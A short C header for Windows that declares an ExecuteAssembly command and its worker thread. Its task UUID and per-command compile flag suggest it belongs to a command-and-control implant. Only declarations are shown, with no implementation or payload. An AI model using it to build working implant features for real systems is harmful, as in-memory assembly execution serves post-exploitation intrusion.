#pragma once
#ifndef EXECUTE_ASSEMBLY_H
#define EXECUTE_ASSEMBLY_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

VOID ExecuteAssembly(_In_ PCHAR taskUuid, _In_ PPARSER arguments);

DWORD WINAPI ExecuteAssemblyThread(_In_ LPVOID lpTaskParamter);

#endif //INCLUDE_CMD_EXECUTE_ASSEMBLY

#endif  //EXECUTE_ASSEMBLY_H